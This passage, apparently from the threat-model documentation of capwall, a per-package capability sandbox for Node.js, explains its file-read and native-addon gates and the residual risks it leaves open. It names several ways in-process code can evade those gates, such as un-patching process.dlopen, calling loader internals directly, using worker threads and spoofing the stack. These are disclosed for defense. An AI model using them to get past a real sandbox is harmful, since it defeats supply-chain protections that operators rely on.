that direction is recording, not enforcement, which happens on the loader thread.

**Carve-out: `.node`.** An addon load is already gated as `native` at `process.dlopen`, which is
*stricter* than this gate — it charges both the caller and the addon file's owner, and an addon
outside the project owns to `<unknown>`. Adding an `fs.read` decision on top would emit a second
grant from `observe` and change no outcome, so `.node` skips this gate and keeps #49's.

**What this does NOT close — residuals, stated plainly:**

- **Any file inside any `node_modules` tree remains freely loadable** by any dependency —
  a sibling package's `package.json` or shipped fixtures. That is the price of the graph
  exemption, and it is what keeps `require("mime-db")` (whose `main` *is* a `.json` file) working
  without a grant. It is bounded to published artifacts of packages the project already installed,
  and a dependency could already `require` such a package and run its code.
- **The gate is on the load, not on the cache.** A module some other principal already loaded is
  served from `Module._cache` / the ESM registry without reaching a loader hook, so the decision is
  taken once, for whoever loaded it first.
- **Reaching past the loader entirely** — calling `Module._extensions[".json"](m, file)` directly,
  or `process.binding` — is the same class of escape as un-patching any shim, which capwall does
  not claim to stop. So is a hostile module-customization hook registered ahead of capwall's (see
  § ESM known limits).
- **Network imports** (`import("https://…")`) read no local file and are not mediated by this gate
  or any other.
- **A compatibility change worth knowing about:** a test runner, bundler or framework that loads
  the *application's own* files (`mocha` requiring `test/*.spec.js`, a config loader requiring
  `<project>/app.config.js`) now needs an `fs.read` grant covering them. That is a true statement
  about what those tools do, and `capwall observe` generates the grant from the trace.

## Native `.node` addons

**What the gate does: a load-time decision. What it does not do: any confinement
whatsoever.** Those are the terms, and they are not softened anywhere in this project.

capwall attributes every native-addon load and evaluates it against the `native` capability
(deny-by-default in `enforce`, recorded in `observe`). The answer it produces is exactly one
bit: *may this package bring compiled code into this process*. Once the answer is yes and
`dlopen` returns, capwall's view ends. The addon runs with the process's full ambient
authority — it calls `open(2)`, `connect(2)` and reads `environ` directly, never touching a
shimmed JS builtin — and none of that is visible to capwall, let alone controllable by it.
This is the deliberate scope, not a gap awaiting a fix: confining native code would require a
different mechanism entirely (an OS sandbox — seccomp, a container, a jail), which is a layer
below capwall and is where that job belongs.

So: **a granted addon is an unconditional grant of everything.** A package with
`"native": true` and `"net": { "hosts": [] }` is not a package that cannot reach the network.
It is a package whose *JavaScript* cannot reach the network, and which you have separately
allowed to load code that can. Grant `native` the way you would decide to trust a package
completely, because that is what it is.

The value the gate does provide is real but narrow, and worth stating precisely:

- **You know.** A `.node` load was previously invisible — unattributed and ungated. It now
  appears in the observe log, in the trace, and in `capwall diff`, named to a package and a
  file. A dependency that *starts* shipping or downloading an addon is drift you will see.
- **You decide.** Deny-by-default means a package that had no native code when you reviewed
  it cannot silently acquire some in a later version and have it load. That is the
  supply-chain shape capwall exists for: the compromised update, not the addon that was
  always there.

### Coverage

The gate is a patch on `process.dlopen`, which is the single JS-reachable chokepoint every
addon load passes through: `Module._extensions[".node"]`'s entire body is
`return process.dlopen(module, path.toNamespacedPath(filename))` (verified against Node 20.20,
22.22 and 24.18). Consequently it covers `require("./build/Release/foo.node")`, a **direct**
`process.dlopen(...)` call that bypasses the module system entirely, and the resolver wrappers
real native packages use — `bindings` and `node-gyp-build` both end at a plain `require()` of
the `.node` file, and `@mapbox/node-pre-gyp` only resolves a path that the consuming package
then requires. Gating the literal `require` specifier alone would have left the direct `dlopen`
call open and made the gate decorative.

Being a `process.dlopen` patch rather than a loader hook also makes it module-system-independent
for free: it is on whether or not the ESM hook is registered, and it does not care that Node
itself refuses `import("./foo.node")` outright (`ERR_UNKNOWN_FILE_EXTENSION` — the only route
from ESM is `createRequire`, which lands back in the CJS `.node` extension handler and so back
here).

Because those resolvers call `require` from their own source file, the nearest stack frame is
the resolver, not the package whose addon is loading. A `.node` load is therefore charged to
**both** the caller and the principal the addon file belongs to — the owning package, `<app>`
for the project's own build output, `<unknown>` for a file under neither — and both must be
granted. See `docs/policy-format.md` § `native` for what that means for a policy. Without the
caller subject, an `observe` run would hand you `"node-gyp-build": { "native": true }`, a
single grant unlocking native loads tree-wide; without the `<unknown>` case, a `.node` written
to a temp dir and dlopened would be charged to `<app>` and ride on the trust root's grants —
the same fail-open #60 closed for the stack walk, arriving by a different route.

### Known non-coverage, stated rather than implied

- A **`worker_threads.Worker`** is a fresh Node context with its own `process` object, so the
  patch does not exist inside it. Workers are gated separately by `worker_threads`; a package
  granted that gate can load an addon inside a worker un-gated.
- A dependency that captured `process.dlopen` **before capwall installed** keeps an un-gated
  reference — the same pre-install-capture residual as every shim. Install via the `--import`
  preload.
- `process.dlopen` is a writable property of `process`, so **un-patching it** is as cheap as
  un-patching any other shim, and the same caveat applies: capwall does not claim to stop
  in-process code that goes looking for the raw primitive.
- Node's experimental `require.addon()` is a C++-side loader that may not route through
  `process.dlopen`. It is absent on Node 20.20, 22.22 and 24.18 as shipped, and
  `node-gyp-build` prefers it when present (`typeof runtimeRequire.addon === "function"`) —
  so it is a live upgrade risk, not a hypothetical. Recheck this hook when it stabilizes.
- An addon already loaded into the process **before** capwall installed is not unloaded and
  not re-gated. The gate is about loads, and only about loads that happen after it is on.
- **Hardened mode (#17) does not help here.** It freezes shim objects; `process.dlopen` is a
  property of `process`, which capwall does not freeze (freezing `process` would break far more
  than it protects). Hardening and this gate are independent controls.

## Comparison to other threat models

### vs SES / hardened primordials (LavaMoat, Endo)

SES freezes the primordials and runs each package in a compartment, so prototype pollution
and primordial-tampering attacks in the list above are largely **in scope** for SES to stop.
capwall accepts those as **out of scope** in exchange for **no SES tax**: no broken packages
from frozen intrinsics, no uneven ESM/native-addon story, near-zero adoption friction.
capwall offers *weaker isolation, dramatically lower friction*. For a hostile,
break-out-motivated adversary, prefer SES; for containing opportunistic supply-chain malware
in an existing Node service with minimal changes, capwall is the pragmatic choice. The two
are composable.

### vs Node's `--permission` model

Node's built-in permission model is **process-global**: one `--allow-fs-read` set applies to
the entire process, so you cannot say "express may read `./views`, but this transitive dep
may read nothing." capwall's contribution is exactly the **per-package** dimension. Node's
model, being enforced deeper (in the runtime, not via JS shims), is harder to un-patch —
another reason capwall is defense-in-depth *alongside* it, not a replacement.

### vs scanners (guarddog, Socket)

Scanners try to **detect** a malicious package before or as it enters your tree. capwall
assumes detection failed and a bad package is present, then **contains what it can do at
runtime.** Complementary layers, not competitors.

## Residual risk statement

Deploying capwall in `enforce` mode meaningfully raises the cost of opportunistic
supply-chain malware and gives you a per-package audit trail. It does **not** provide a
security boundary against a determined, capwall-aware in-process attacker. The bound is the one
stated at the top of this document: every gate here is a decision about a principal, and the
principal comes from V8 stack machinery any code in the process can replace with one assignment
— silently, without persisting, and with hardened mode on. Treat capwall as one
layer of defense-in-depth, alongside dependency review, lockfile pinning, least-privilege
process/OS sandboxing (containers, seccomp), and secret hygiene.
